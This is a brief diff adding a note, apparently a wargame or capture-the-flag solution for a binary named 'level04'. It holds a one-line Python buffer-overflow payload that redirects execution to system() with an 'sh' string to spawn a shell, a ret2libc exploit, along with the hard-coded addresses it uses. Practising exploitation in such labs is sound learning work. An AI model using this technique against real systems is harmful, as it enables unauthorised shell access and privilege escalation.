@@ -1,0 +1,7 @@
+we need to execute:
+```
+(python -c 'from struct import *; print "a"*156 + pack("I", 0xf7e6aed0) + "aaaa" + pack("I", 0x8048312)' ; cat) | ./level04
+```
+0xf7e6aed0: system() address
+0x8048312: "sh" address
+
